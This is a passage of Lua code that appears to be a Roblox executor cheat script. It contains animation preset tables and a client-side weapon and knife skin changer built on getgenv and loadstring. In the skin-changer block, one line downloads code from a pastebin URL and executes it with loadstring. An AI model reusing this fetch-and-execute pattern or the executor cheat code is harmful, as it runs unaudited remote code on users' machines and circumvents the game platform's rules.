		['Mage'] = { Idle = 'rbxassetid://707855907', Run = 'rbxassetid://707861613', Walk = 'rbxassetid://707897309', Jump = 'rbxassetid://707853694', Fall = 'rbxassetid://707829716', Climb = 'rbxassetid://707826056', Swim = 'rbxassetid://10921150788', SwimIdle = 'rbxassetid://10921151661' },
		['Stylish'] = { Idle = 'rbxassetid://616138447', Run = 'rbxassetid://616140816', Walk = 'rbxassetid://616146177', Jump = 'rbxassetid://616139451', Fall = 'rbxassetid://616134815', Climb = 'rbxassetid://616133594', Swim = 'rbxassetid://10921281000', SwimIdle = 'rbxassetid://10921281964' },
		['Hero'] = { Idle = 'rbxassetid://616113536', Run = 'rbxassetid://616117076', Walk = 'rbxassetid://616122287', Jump = 'rbxassetid://616115533', Fall = 'rbxassetid://616108001', Climb = 'rbxassetid://616104706', Swim = 'rbxassetid://10921295495', SwimIdle = 'rbxassetid://10921297391' },
		['Toy'] = { Idle = 'rbxassetid://782845736', Run = 'rbxassetid://782842708', Walk = 'rbxassetid://782843345', Jump = 'rbxassetid://782847020', Fall = 'rbxassetid://782846423', Climb = 'rbxassetid://782843869', Swim = 'rbxassetid://10921309319', SwimIdle = 'rbxassetid://10921310341' },
		['Astronaut'] = { Idle = 'rbxassetid://891633237', Run = 'rbxassetid://891636393', Walk = 'rbxassetid://891667138', Jump = 'rbxassetid://891627522', Fall = 'rbxassetid://891617961', Climb = 'rbxassetid://891609353', Swim = 'rbxassetid://10921044000', SwimIdle = 'rbxassetid://10921045006' },
		['Bubbly'] = { Idle = 'rbxassetid://910009958', Run = 'rbxassetid://910025107', Walk = 'rbxassetid://910034870', Jump = 'rbxassetid://910016857', Fall = 'rbxassetid://910001910', Climb = 'rbxassetid://742636889', Swim = 'rbxassetid://10921063569', SwimIdle = 'rbxassetid://10922582160' },
		['Cartoony'] = { Idle = 'rbxassetid://742638445', Run = 'rbxassetid://742638842', Walk = 'rbxassetid://742640026', Jump = 'rbxassetid://742637942', Fall = 'rbxassetid://742637151', Climb = 'rbxassetid://742636889', Swim = 'rbxassetid://10921079380', SwimIdle = 'rbxassetid://10921081059' },
		['Elder'] = { Idle = 'rbxassetid://845400520', Run = 'rbxassetid://845386501', Walk = 'rbxassetid://845403856', Jump = 'rbxassetid://845398858', Fall = 'rbxassetid://845396048', Climb = 'rbxassetid://845392038', Swim = 'rbxassetid://10921108971', SwimIdle = 'rbxassetid://10921110146' },
		['Ghost'] = { Idle = 'rbxassetid://616008087', Run = 'rbxassetid://616013216', Walk = 'rbxassetid://616013216', Jump = 'rbxassetid://616008936', Fall = 'rbxassetid://616005863', Climb = 'rbxassetid://616156119', Swim = 'rbxassetid://133308483266208', SwimIdle = 'rbxassetid://109346520324160' },
		['Knight'] = { Idle = 'rbxassetid://657568135', Run = 'rbxassetid://657564596', Walk = 'rbxassetid://657552124', Jump = 'rbxassetid://658409194', Fall = 'rbxassetid://657600338', Climb = 'rbxassetid://658360781', Swim = 'rbxassetid://10921125160', SwimIdle = 'rbxassetid://10921125935' },
		['Vampire'] = { Idle = 'rbxassetid://1083450166', Run = 'rbxassetid://1083462077', Walk = 'rbxassetid://1083473930', Jump = 'rbxassetid://1083455352', Fall = 'rbxassetid://1083443587', Climb = 'rbxassetid://1083439238', Swim = 'rbxassetid://10921324408', SwimIdle = 'rbxassetid://10921325443' },
		['Werewolf'] = { Idle = 'rbxassetid://1083214717', Run = 'rbxassetid://1083216690', Walk = 'rbxassetid://1083178339', Jump = 'rbxassetid://1083218792', Fall = 'rbxassetid://1083189019', Climb = 'rbxassetid://1083182000', Swim = 'rbxassetid://10921340419', SwimIdle = 'rbxassetid://10921341319' },
		['Zombie'] = { Idle = 'rbxassetid://616160636', Run = 'rbxassetid://616163682', Walk = 'rbxassetid://616168032', Jump = 'rbxassetid://616161997', Fall = 'rbxassetid://616157476', Climb = 'rbxassetid://616156119', Swim = 'rbxassetid://10921352344', SwimIdle = 'rbxassetid://10921353442' },
		['Bold'] = { Idle = 'rbxassetid://16738334710', Run = 'rbxassetid://16738337225', Walk = 'rbxassetid://16738340646', Jump = 'rbxassetid://16738336650', Fall = 'rbxassetid://16738333171', Climb = 'rbxassetid://16738332169', Swim = 'rbxassetid://16738339158', SwimIdle = 'rbxassetid://16738339817' },
		['Adidas'] = { Idle = 'rbxassetid://18537371272', Run = 'rbxassetid://18537384940', Walk = 'rbxassetid://18537392113', Jump = 'rbxassetid://18537380791', Fall = 'rbxassetid://18537367238', Climb = 'rbxassetid://18537363391', Swim = 'rbxassetid://18537389531', SwimIdle = 'rbxassetid://18537387180' },
		['Catwalk'] = { Idle = 'rbxassetid://94970088341563', Run = 'rbxassetid://81024476153754', Walk = 'rbxassetid://109168724482748', Jump = 'rbxassetid://116936326516985', Fall = 'rbxassetid://119377220967554', Climb = 'rbxassetid://92294537340807', Swim = 'rbxassetid://134591743181628', SwimIdle = 'rbxassetid://98854111361360' },
		['Walmart'] = { Idle = 'rbxassetid://18747063918', Run = 'rbxassetid://18747070484', Walk = 'rbxassetid://18747074203', Jump = 'rbxassetid://18747069148', Fall = 'rbxassetid://18747062535', Climb = 'rbxassetid://18747060903', Swim = 'rbxassetid://18747073181', SwimIdle = 'rbxassetid://18747071682' },
		['Wicked'] = { Idle = 'rbxassetid://76049494037641', Run = 'rbxassetid://72301599441680', Walk = 'rbxassetid://92072849924640', Jump = 'rbxassetid://104325245285198', Fall = 'rbxassetid://121152442762481', Climb = 'rbxassetid://131326830509784', Swim = 'rbxassetid://99384245425157', SwimIdle = 'rbxassetid://113199415118199' },
		['NFL'] = { Idle = 'rbxassetid://74451233229259', Run = 'rbxassetid://117333533048078', Walk = 'rbxassetid://110358958299415', Jump = 'rbxassetid://119846112151352', Fall = 'rbxassetid://129773241321032', Climb = 'rbxassetid://134630013742019', Swim = 'rbxassetid://132697394189921', SwimIdle = 'rbxassetid://79090109939093' },
		['Pirate'] = { Idle = 'rbxassetid://750782770', Run = 'rbxassetid://750783738', Walk = 'rbxassetid://750785693', Jump = 'rbxassetid://750782230', Fall = 'rbxassetid://750780242', Climb = 'rbxassetid://750779899', Swim = 'rbxassetid://750784579', SwimIdle = 'rbxassetid://750785176' },
		['Adidas2'] = { Idle = 'rbxassetid://102357151005774', Run = 'rbxassetid://82598234841035', Walk = 'rbxassetid://122150855457006', Jump = 'rbxassetid://75290611992385', Fall = 'rbxassetid://98600215928904', Climb = 'rbxassetid://88763136693023', Swim = 'rbxassetid://133308483266208', SwimIdle = 'rbxassetid://109346520324160' },
		['Animals'] = { Idle = 'rbxassetid://102357151005774', Run = 'rbxassetid://87721497492370', Walk = 'rbxassetid://122150855457006', Jump = 'rbxassetid://75290611992385', Fall = 'rbxassetid://98600215928904', Climb = 'rbxassetid://88763136693023', Swim = 'rbxassetid://133308483266208', SwimIdle = 'rbxassetid://109346520324160' },
		['Aura'] = { Idle = 'rbxassetid://114191137265065', Run = 'rbxassetid://118320322718866', Walk = 'rbxassetid://83842218823011', Jump = 'rbxassetid://109996626521204', Fall = 'rbxassetid://95603166884636', Climb = 'rbxassetid://97824616490448', Swim = 'rbxassetid://134530128383903', SwimIdle = 'rbxassetid://94922130551805' },
		['Wicked2'] = { Idle = 'rbxassetid://132238900951109', Run = 'rbxassetid://135515454877967', Walk = 'rbxassetid://73718308412641', Jump = 'rbxassetid://78508480717326', Fall = 'rbxassetid://78147885297412', Climb = 'rbxassetid://129447497744818', Swim = 'rbxassetid://110657013921774', SwimIdle = 'rbxassetid://129183123083281' },
		['Unboxed'] = { Idle = 'rbxassetid://138183121662404', Run = 'rbxassetid://134824450619865', Walk = 'rbxassetid://90478085024465', Jump = 'rbxassetid://121454505477205', Fall = 'rbxassetid://94788218468396', Climb = 'rbxassetid://121145883950231', Swim = 'rbxassetid://105962919001086', SwimIdle = 'rbxassetid://129126268464847' },
		['Ud'] = { Idle = 'rbxassetid://3303162549', Run = 'rbxassetid://3236836670', Walk = 'rbxassetid://3303162967', Jump = 'rbxassetid://10921263860', Fall = 'rbxassetid://10921262864', Climb = 'rbxassetid://10921257536', Swim = 'rbxassetid://10921264784', SwimIdle = 'rbxassetid://10921265698' },
		['Toilet'] = { Idle = 'rbxassetid://4417978624', Run = 'rbxassetid://4417979645', Walk = 'rbxassetid://10921269718', Jump = 'rbxassetid://10921263860', Fall = 'rbxassetid://10921262864', Climb = 'rbxassetid://10921257536', Swim = 'rbxassetid://10921264784', SwimIdle = 'rbxassetid://10921265698' },
		['Gm'] = { Idle = 'rbxassetid://96439737641086', Run = 'rbxassetid://101925097435036', Walk = 'rbxassetid://85809016093530', Jump = 'rbxassetid://74159004634379', Fall = 'rbxassetid://98070939608691', Climb = 'rbxassetid://108236155509584', Swim = 'rbxassetid://83003487432457', SwimIdle = 'rbxassetid://112946194103503' },
		['Kat'] = { Idle = 'rbxassetid://72329200359275', Run = 'rbxassetid://73117360545482', Walk = 'rbxassetid://99182913548783', Jump = 'rbxassetid://103632305262747', Fall = 'rbxassetid://127802717128367', Climb = 'rbxassetid://106213237973858', Swim = 'rbxassetid://134148268480210', SwimIdle = 'rbxassetid://138619485942849' },
		['Oldschool'] = { Idle = 'rbxassetid://10921232093', Run = 'rbxassetid://10921240218', Walk = 'rbxassetid://10921244891', Jump = 'rbxassetid://10921242013', Fall = 'rbxassetid://10921241244', Climb = 'rbxassetid://10921229866', Swim = 'rbxassetid://10921243048', SwimIdle = 'rbxassetid://10921244018' },
	};

	local ANIM_FOLDER_MAP = {
		['Idle'] = { Folder = 'idle',     Children = { 'Animation1', 'Animation2' } },
		['Run'] = { Folder = 'run',      Children = { 'RunAnim' } },
		['Walk'] = { Folder = 'walk',     Children = { 'WalkAnim' } },
		['Jump'] = { Folder = 'jump',     Children = { 'JumpAnim' } },
		['Fall'] = { Folder = 'fall',     Children = { 'FallAnim' } },
		['Climb'] = { Folder = 'climb',    Children = { 'ClimbAnim' } },
		['Swim'] = { Folder = 'swim',     Children = { 'Swim' } },
		['SwimIdle'] = { Folder = 'swimidle', Children = { 'SwimIdleAnim' } },
	};

	local function ResolveAnimId(preset, slot)
		if not preset then return nil end;
		if preset:sub(1, 13) == 'rbxassetid://' or preset:match('^%d+$') then
			return 'rbxassetid://' .. preset:match('%d+');
		end;
		local pack = ANIM_PRESETS[preset];
		if not pack then return nil end;
		local id = pack[slot];
		if not id then return nil end;
		if id:sub(1, 13) == 'rbxassetid://' then return id end;
		return 'rbxassetid://' .. id;
	end;

	local function ApplyAnimChanger(Character)
		local AnimCfg = ({['Enabled']=false});
		if not AnimCfg['Enabled'] then return end;
		local Animate = Character:FindFirstChild('Animate');
		if not Animate then return end;
		local Humanoid = Character:FindFirstChildOfClass('Humanoid');
		if not Humanoid then return end;

		local AnimSlots = AnimCfg['Animations'] or {};
		for CfgSlot, FolderInfo in next, ANIM_FOLDER_MAP do
			local Preset = AnimSlots[CfgSlot];
			if not Preset then continue end;
			local Id = ResolveAnimId(Preset, CfgSlot);
			if not Id then continue end;
			local Folder = Animate:FindFirstChild(FolderInfo.Folder);
			if not Folder then continue end;
			for _, ChildName in next, FolderInfo.Children do
				local Anim = Folder:FindFirstChild(ChildName);
				if Anim and Anim:IsA('Animation') then
					Anim.AnimationId = Id;
				end;
			end;
		end;

		for _, Track in next, Humanoid:GetPlayingAnimationTracks() do
			pcall(function() Track:Stop(0) end);
		end;
		pcall(function()
			local AnimateScript = Character:FindFirstChild('Animate');
			if AnimateScript then
				AnimateScript.Disabled = true;
				AnimateScript.Disabled = false;
			end;
		end);
	end;

	local AnimCfg = ({['Enabled']=false});
	if AnimCfg['Enabled'] then
		if LocalPlayer.Character then
			task.delay(0.5, function() ApplyAnimChanger(LocalPlayer.Character) end);
		end;
		TrackConn(LocalPlayer.CharacterAdded:Connect(function(Character)
			task.delay(1, function() ApplyAnimChanger(Character) end);
		end));
	end;
end;


do
	local function GetSkinChangerCfg() return GetConfig()['Misc']['Skin Changer'] end;
	if type(getgenv) == 'function' then
		local prevApplied = getgenv().__scAppliedSkins;
		if prevApplied then
			for _, entry in next, prevApplied do
				if entry and entry.Connections then
					for _, c in next, entry.Connections do
						pcall(function() if c.Connected then c:Disconnect() end end);
					end;
				end;
			end;
		end;
		local prevKnife = getgenv().__scKnifeData;
		if prevKnife then
			for _, data in next, prevKnife do
				if data and data.conns then
					for _, c in next, data.conns do
						pcall(function() if c.Connected then c:Disconnect() end end);
					end;
				end;
			end;
		end;
	end;
	local AppliedSkins = {};
	local KnifeData = {};
	local InitialGunSkinRefreshDone = {};
	local PendingSkinReprocess = {};
	if type(getgenv) == 'function' then
		getgenv().__scAppliedSkins = AppliedSkins;
		getgenv().__scKnifeData = KnifeData;
	end;
	local ToolRegistry = {};
	local SkinAssets = CachedSkinAssets;
	local SkinModules = ReplicatedStorage:FindFirstChild('SkinModules');
	local SkinData = nil;
	task.spawn(function()
		if not SkinModules then
			local ok, found = pcall(function()
				return ReplicatedStorage:WaitForChild('SkinModules', 3);
			end);
			if ok and found then SkinModules = found; end;
		end;
		if SkinModules and typeof(SkinModules) == 'Instance' and SkinModules:IsA('ModuleScript') then
			local ok, result = pcall(require, SkinModules);
			if ok and type(result) == 'table' then
				SkinData = result;
				return;
			end;
		end;
		local httpFn = (type(game.HttpGet) == 'function' and function(url) return game:HttpGet(url) end)
			or (type(getgenv) == 'function' and getgenv().http_request and function(url)
				local res = getgenv().http_request({ Url = url, Method = 'GET' });
				return res and res.Body;
			end)
			or (type(getgenv) == 'function' and getgenv().request and function(url)
				local res = getgenv().request({ Url = url, Method = 'GET' });
				return res and res.Body;
			end);
		if httpFn then
			local ok, body = pcall(httpFn, 'https://pastebin.com/raw/0uZ107WE');
			if ok and body then
				local fn = loadstring(body);
				if fn then
					local ok2, result = pcall(fn);
					if ok2 and type(result) == 'table' then
						SkinData = result;
					elseif ok2 and shared.skin_modules and next(shared.skin_modules) then
						SkinData = shared.skin_modules;
					end;
				end;
			end;
		end;

		task.wait(0.5);
		if SkinData then
			local SkinCfg = GetSkinChangerCfg();
			if SkinCfg and SkinCfg['Enabled'] then
				local Skins = SkinCfg['Skins'];
				local function reapplyContainer(Container)
					if not Container then return; end;
					for _, Tool in next, Container:GetChildren() do
						if Tool:IsA('Tool') then
							local SkinName = Skins[Tool.Name];
							if not SkinName then
								local stripped = Tool.Name:gsub('%[', ''):gsub('%]', '');
								SkinName = Skins['[' .. stripped .. ']'];
							end;
							if SkinName and SkinName ~= '' and SkinName ~= 'None' then
								pcall(function() RemoveSkinFromTool(Tool) end);
								ToolRegistry[Tool] = nil;
								pcall(function() ProcessTool(Tool) end);
							end;
						end;
					end;
				end;
				pcall(function() reapplyContainer(LocalPlayer.Character) end);
				pcall(function() reapplyContainer(LocalPlayer:FindFirstChild('Backpack')) end);
			end;
		end;
	end);

	local function IsKnifeSkin(name)
		local n = name:gsub(' ', '');
		return n == 'GoldenAgeTanto' or n == 'GPO-Knife' or n == 'GPO-KnifePrestige' or n == 'Heaven'
			or n == 'LoveKukri' or n == 'PurpleDagger' or n == 'BlueDagger' or n == 'GreenDagger' or n == 'RedDagger';
	end;

	local function CleanKnife(Tool)
		local data = KnifeData[Tool];
		if data then
			if data.conns then
				for _, c in next, data.conns do
					if c then c:Disconnect() end;
				end;
				data.conns = nil;
			end;
			if data.track then
				data.track:Stop();
				data.track:Destroy();
				data.track = nil;
			end;
			if data.welds then
				for _, w in next, data.welds do
					if w then w:Destroy() end;
				end;
			end;
			if data.sounds then
				for _, s in next, data.sounds do
					if s and s.Parent then s:Destroy() end;
				end;
			end;
		end;
		local mesh = Tool:FindFirstChild('Default');
		if mesh then
			for _, v in next, mesh:GetChildren() do
				if v.Name == 'Handle.R' or v:IsA('Model') or (v:IsA('BasePart') and v.Name ~= 'Default') then
					v:Destroy();
				end;
			end;
			mesh.Transparency = 0;
		end;
		for _, v in next, Tool:GetChildren() do
			if (v:IsA('Model') or v:IsA('MeshPart')) and v ~= mesh and v.Name ~= 'Handle' then
				v:Destroy();
			end;
		end;
		KnifeData[Tool] = nil;
	end;

	local function ApplyKnife(Character, Tool, SkinName)
		if not IsKnifeSkin(SkinName) then return end;
		if Tool.Parent ~= Character then return end;
		local Humanoid = Character:FindFirstChild('Humanoid');
		local rhand = Character:FindFirstChild('RightHand');
		if not Humanoid or not rhand then return end;

		local existing = KnifeData[Tool];
		if existing and existing.welds and #existing.welds > 0 then
			local handleR = Tool:FindFirstChild('Default') and Tool:FindFirstChild('Default'):FindFirstChild('Handle.R');
			if handleR and handleR.Parent then
				local m6d = handleR:FindFirstChildOfClass('Motor6D');
				if m6d then
					m6d.Part0 = rhand;
				end;
				local defMesh = Tool:FindFirstChild('Default');
				if defMesh then
					defMesh.Transparency = 1;
					for _, v in next, defMesh:GetChildren() do
						if (v:IsA('Model') or v:IsA('MeshPart')) and v.Name ~= SkinName then
							v:Destroy();
						end;
					end;
				end;
				for _, v in next, Tool:GetChildren() do
					if (v:IsA('Model') or v:IsA('MeshPart')) and v ~= defMesh and v.Name ~= 'Handle' and v.Name ~= SkinName then
						v:Destroy();
					end;
				end;
				local Animator = Humanoid:FindFirstChildOfClass('Animator');
				if Animator then
					local n = SkinName:gsub(' ', '');
					local animId, sndId;
					if n == 'GoldenAgeTanto' then animId = 'rbxassetid://13473404819'; sndId = 'rbxassetid://5917819099';
					elseif n == 'GPO-Knife' or n == 'GPO-KnifePrestige' then animId = 'rbxassetid://14014278925'; sndId = 'rbxassetid://4604390759';
					elseif n == 'Heaven' then animId = 'rbxassetid://14500266726'; sndId = 'rbxassetid://14489860007';
					elseif n == 'PurpleDagger' then animId = 'rbxassetid://17824999722'; sndId = 'rbxassetid://17822743153';
					elseif n == 'BlueDagger' then animId = 'rbxassetid://17824995184'; sndId = 'rbxassetid://17822737046';
					elseif n == 'GreenDagger' then animId = 'rbxassetid://17825004320'; sndId = 'rbxassetid://17822741762';
					elseif n == 'RedDagger' then animId = 'rbxassetid://17825008844'; sndId = 'rbxassetid://17822952417';
					end;
					if animId then
						if existing.track then
							existing.track:Stop();
							existing.track:Destroy();
							existing.track = nil;
						end;
						local anim = Instance.new('Animation');
						anim.AnimationId = animId;
						local track = Animator:LoadAnimation(anim);
						track.Looped = false;
						track:Play();
						existing.track = track;
						anim:Destroy();
						track.Ended:Once(function()
							if existing.track == track then existing.track = nil end;
							track:Destroy();
						end);
					end;
					if sndId then
						local snd = Instance.new('Sound');
						snd.SoundId = sndId;
						snd.Parent = Workspace;
						snd:Play();
						table.insert(existing.sounds, snd);
						snd.Ended:Connect(function()
							snd:Destroy();
						end);
					end;
				end;
				return;
			end;
		end;

		CleanKnife(Tool);
		KnifeData[Tool] = { track = nil, welds = {}, sounds = {} };
		local data = KnifeData[Tool];
		local mesh = Tool:FindFirstChild('Default');
		if not mesh then return end;
		mesh.Transparency = 1;
		local knives = SkinModules and SkinModules:FindFirstChild('Knives');
		if not knives then return end;
		local skinmodel = knives:FindFirstChild(SkinName);
		if not skinmodel then return end;
		local clone = skinmodel:Clone();
		clone.Name = SkinName;
		local handr = Instance.new('Part');
		handr.Name = 'Handle.R';
		handr.Transparency = 1;
		handr.CanCollide = false;
		handr.Anchored = false;
		handr.Size = Vector3New(0.001, 0.001, 0.001);
		handr.Massless = true;
		handr.Parent = mesh;
		local m6d = Instance.new('Motor6D');
		m6d.Name = 'Handle.R';
		m6d.Part0 = rhand;
		m6d.Part1 = handr;
		m6d.Parent = handr;

		local offset, animId, sndId;
		local n = SkinName:gsub(' ', '');

		if n == 'GoldenAgeTanto' then
			offset = CFrameNew(0, -0.20, -1.2) * CFrame.Angles(MathRad(90), MathRad(263.7), MathRad(180));
			animId = 'rbxassetid://13473404819';
			sndId = 'rbxassetid://5917819099';
		elseif n == 'GPO-Knife' or n == 'GPO-KnifePrestige' then
			offset = CFrameNew(0, -0.32, -1.07) * CFrame.Angles(MathRad(90), MathRad(-97.4), MathRad(90));
			animId = 'rbxassetid://14014278925';
			sndId = 'rbxassetid://4604390759';
		elseif n == 'Heaven' then
			offset = CFrameNew(-0.02, -0.82, 0.20) * CFrame.Angles(MathRad(64.42), MathRad(3.79), MathRad(0));
			animId = 'rbxassetid://14500266726';
			sndId = 'rbxassetid://14489860007';
		elseif n == 'LoveKukri' then
			offset = CFrameNew(-0.14, 0.14, -1.62) * CFrame.Angles(MathRad(-90), MathRad(180), MathRad(-4.97));
		elseif n == 'PurpleDagger' then
			offset = CFrameNew(-0.13, -0.24, -1.80) * CFrame.Angles(MathRad(89.05), MathRad(96.63), MathRad(180));
			animId = 'rbxassetid://17824999722';
			sndId = 'rbxassetid://17822743153';
		elseif n == 'BlueDagger' then
			offset = CFrameNew(-0.13, -0.24, -1.80) * CFrame.Angles(MathRad(89.05), MathRad(96.63), MathRad(180));
			animId = 'rbxassetid://17824995184';
			sndId = 'rbxassetid://17822737046';
		elseif n == 'GreenDagger' then
			offset = CFrameNew(-0.13, -0.24, -1.07) * CFrame.Angles(MathRad(89.05), MathRad(96.63), MathRad(180));
			animId = 'rbxassetid://17825004320';
			sndId = 'rbxassetid://17822741762';
		elseif n == 'RedDagger' then
			offset = CFrameNew(-0.13, -0.24, -1.07) * CFrame.Angles(MathRad(89.05), MathRad(96.63), MathRad(180));
			animId = 'rbxassetid://17825008844';
			sndId = 'rbxassetid://17822952417';
		end;

		if not offset then return end;

		if clone:IsA('Model') then
			if not clone.PrimaryPart then
				for _, c in next, clone:GetChildren() do
					if c:IsA('BasePart') then
						clone.PrimaryPart = c;
						break;
					end;
				end;
			end;
			if clone.PrimaryPart then
				for _, p in next, clone:GetDescendants() do
					if p:IsA('BasePart') then
						p.CanCollide = false;
						p.Massless = true;
						p.Anchored = false;
						local w = Instance.new('Weld');
						w.Part0 = handr;
						w.Part1 = p;
						w.C0 = offset;
						w.C1 = p.CFrame:ToObjectSpace(clone.PrimaryPart.CFrame);
						w.Parent = p;
						table.insert(data.welds, w);
					end;
				end;
			end;
			clone.Parent = mesh;
		elseif clone:IsA('BasePart') then
			clone.CanCollide = false;
			clone.Massless = true;
			clone.Anchored = false;
			clone.Parent = mesh;
			local w = Instance.new('Weld');
			w.Part0 = handr;
			w.Part1 = clone;
			w.C0 = offset;
			w.Parent = clone;
			table.insert(data.welds, w);
		end;

		local Animator = Humanoid:FindFirstChildOfClass('Animator');
		if not Animator then
			Animator = Instance.new('Animator');
			Animator.Parent = Humanoid;
		end;
		if animId then
			local anim = Instance.new('Animation');
			anim.AnimationId = animId;
			local track = Animator:LoadAnimation(anim);
			track.Looped = false;
			track:Play();
			data.track = track;
			anim:Destroy();
			track.Ended:Once(function()
				if data.track == track then
					data.track = nil;
				end;
				track:Destroy();
			end);
		end;
		if sndId then
			local snd = Instance.new('Sound');
			snd.SoundId = sndId;
			snd.Parent = Workspace;
			snd:Play();
			table.insert(data.sounds, snd);
			snd.Ended:Connect(function()
				snd:Destroy();
			end);
		end;
		data.conns = data.conns or {};
		local function StripKnifeIntruders()
			if KnifeData[Tool] ~= data then return end;
			if mesh and mesh.Parent then
				mesh.Transparency = 1;
				for _, v in next, mesh:GetChildren() do
					if (v:IsA('Model') or v:IsA('MeshPart')) and v.Name ~= SkinName then
						v:Destroy();
					end;
				end;
			end;
			for _, v in next, Tool:GetChildren() do
				if (v:IsA('Model') or v:IsA('MeshPart')) and v ~= mesh and v.Name ~= 'Handle' and v.Name ~= SkinName then
					v:Destroy();
				end;
			end;
		end;
		local kc1 = Tool.ChildAdded:Connect(function(c)
			if (c:IsA('Model') or c:IsA('MeshPart')) and c ~= mesh and c.Name ~= 'Handle' and c.Name ~= SkinName then
				task.defer(StripKnifeIntruders);
			end;
		end);
		table.insert(data.conns, kc1);
		if mesh then
			local kc2 = mesh.ChildAdded:Connect(function(c)
				if (c:IsA('Model') or c:IsA('MeshPart')) and c.Name ~= SkinName then
					task.defer(StripKnifeIntruders);
				end;
			end);
			table.insert(data.conns, kc2);
			local kc3 = mesh:GetPropertyChangedSignal('Transparency'):Connect(function()
				if KnifeData[Tool] == data and mesh.Transparency ~= 1 then
					mesh.Transparency = 1;
				end;
			end);
			table.insert(data.conns, kc3);
		end;
	end;

	local function LoadSkinData()
		if SkinData then return SkinData end;
		if SkinModules and typeof(SkinModules) == 'Instance' and SkinModules:IsA('ModuleScript') then
			local ok, result = pcall(require, SkinModules);
			if ok and type(result) == 'table' then SkinData = result; end;
		end;
		if not SkinData and shared.skin_modules and next(shared.skin_modules) then
			SkinData = shared.skin_modules;
		end;
		if SkinData then
			for Tool, SkinName in next, PendingSkinReprocess do
				if Tool and Tool.Parent and SkinName and SkinName ~= '' and SkinName ~= 'None' then
					task.defer(function()
						ToolRegistry[Tool] = nil;
						ProcessTool(Tool);
					end);
				end;
				PendingSkinReprocess[Tool] = nil;
			end;
		end;
		return SkinData;
	end;

	local function GetSkinInfo(weaponName, skinName)
		local data = LoadSkinData();
		if not data then return nil end;
		local weaponSkins = data[weaponName];
		if not weaponSkins then
			local bracketName = '[' .. weaponName:gsub('%[', ''):gsub('%]', '') .. ']';
			weaponSkins = data[bracketName];
		end;
		if not weaponSkins then return nil end;
		local info = weaponSkins[skinName];
		if not info then
			info = weaponSkins[skinName:gsub('-', ' ')];
		end;
		if not info then
			info = weaponSkins[skinName:gsub('-', '')];
		end;
		return info;
	end;

	local function FindSourceMesh(skinName, meshRef, isKnife)
		if not SkinModules or typeof(SkinModules) ~= 'Instance' then return nil end;
		if isKnife then
			local cleanSkin = skinName:lower():gsub(' ', '');
			local KnivesFolder = SkinModules:FindFirstChild('Knives');
			if KnivesFolder then
				for _, child in next, KnivesFolder:GetChildren() do
					if child:IsA('MeshPart') then
						local cleanName = child.Name:lower():gsub(' ', '');
						if child.Name == skinName or cleanName == cleanSkin then
							return child;
						end;
					elseif child:IsA('Folder') or child:IsA('Model') then
						local cleanName = child.Name:lower():gsub(' ', '');
						if child.Name == skinName or cleanName == cleanSkin then
							for _, sub in next, child:GetChildren() do
								if sub:IsA('MeshPart') then
									return sub;
								end;
							end;
						end;
					end;
				end;
			end;
			if SkinAssets then
				local KnifeFolder = SkinAssets:FindFirstChild('KnifeMeshes') or SkinAssets:FindFirstChild('Knives');
				if KnifeFolder then
					for _, child in next, KnifeFolder:GetChildren() do
						if child:IsA('MeshPart') then
							local cleanName = child.Name:lower():gsub(' ', '');
							if child.Name == skinName or cleanName == cleanSkin then
								return child;
							end;
						elseif child:IsA('Folder') or child:IsA('Model') then
							local cleanName = child.Name:lower():gsub(' ', '');
							if child.Name == skinName or cleanName == cleanSkin then
								for _, sub in next, child:GetChildren() do
									if sub:IsA('MeshPart') then
										return sub;
									end;
								end;
							end;
						end;
					end;
				end;
			end;
			return nil;
		end;
		local MeshesFolder = SkinModules:FindFirstChild('Meshes');
		if not MeshesFolder then return nil end;
		local folderNames = { skinName, skinName:gsub(' ', ''), skinName:gsub(' ', '_') };
		for _, folderName in next, folderNames do
			local skinFolder = MeshesFolder:FindFirstChild(folderName);
			if skinFolder then
				if meshRef then
					for _, child in next, skinFolder:GetChildren() do
						if child:IsA('MeshPart') then
							local cleanChild = child.Name:lower():gsub(' ', ''):gsub('-', '');
							local cleanRef = meshRef:lower():gsub(' ', ''):gsub('-', '');
							if child.Name == meshRef or cleanChild == cleanRef then
								return child;
							end;
						end;
					end;
				end;
				for _, child in next, skinFolder:GetChildren() do
					if child:IsA('MeshPart') then
						return child;
					end;
				end;
			end;
		end;
		if SkinAssets then
			local GunMeshes = SkinAssets:FindFirstChild('GunMeshes');
			if GunMeshes then
				for _, folderName in next, folderNames do
					local skinFolder = GunMeshes:FindFirstChild(folderName);
					if skinFolder then
						for _, child in next, skinFolder:GetChildren() do
							if child:IsA('MeshPart') then
								return child;
							end;
						end;
					end;
				end;
			end;
		end;
		return nil;
	end;

	local function GetShootSound(weaponName, skinName)
		if not SkinAssets then return nil end;
		local GunShootSounds = SkinAssets:FindFirstChild('GunShootSounds');
		if not GunShootSounds then return nil end;
		local WeaponFolder = GunShootSounds:FindFirstChild(weaponName);
		if not WeaponFolder then return nil end;
		local SoundValue = WeaponFolder:FindFirstChild(skinName);
		if SoundValue and SoundValue:IsA('StringValue') then
			return SoundValue.Value;
		end;
		return nil;
	end;

	local ApplySkinToTool;
	local RemoveSkinFromTool;

	local function FindShootSoundInstance(Tool)
		if not Tool then return nil end;
		for _, child in next, Tool:GetDescendants() do
			if child:IsA('Sound') and (child.Name == 'Shoot' or child.Name == 'ShootSound') then
				return child;
			end;
		end;
		return nil;
	end;

	local function GetShootSoundForSkin(Tool)
		local skinData = AppliedSkins[Tool];
		if not skinData then return end;
		local shootSound = FindShootSoundInstance(Tool);
		if not shootSound then return end;
		if not skinData.ShootSoundOriginals then
			skinData.ShootSoundOriginals = {};
		end;
		if skinData.ShootSoundOriginals[shootSound] == nil then
			skinData.ShootSoundOriginals[shootSound] = shootSound.SoundId;
		end;
		skinData.ShootSound = shootSound;
		local soundId = GetShootSound(Tool.Name, skinData.SkinName);
		if soundId and soundId ~= '' then
			shootSound.SoundId = soundId;
		end;
	end;

	local function StripForeignGunMeshes(Tool, default, Handle)
		if not Tool or not default then return end;
		local function IsOurs(nm)
			return #nm == 0 or nm == '\0';
		end;
		for _, child in next, Tool:GetChildren() do
			if child:IsA('MeshPart') and child ~= default and child ~= Handle and not IsOurs(child.Name) then
				child:Destroy();
			end;
		end;
		for _, child in next, default:GetChildren() do
			if child:IsA('MeshPart') and not IsOurs(child.Name) then
				child:Destroy();
			end;
		end;
	end;

	local function ReapplyGunSkinState(Tool)
		local skinData = AppliedSkins[Tool];
		if not skinData then return end;
		local default = skinData.Default;
		if not default or not default.Parent then return end;
		local Handle = Tool and Tool:FindFirstChild('Handle');
		StripForeignGunMeshes(Tool, default, Handle);
		if skinData.HideDefault then
			if default.Transparency ~= 1 then
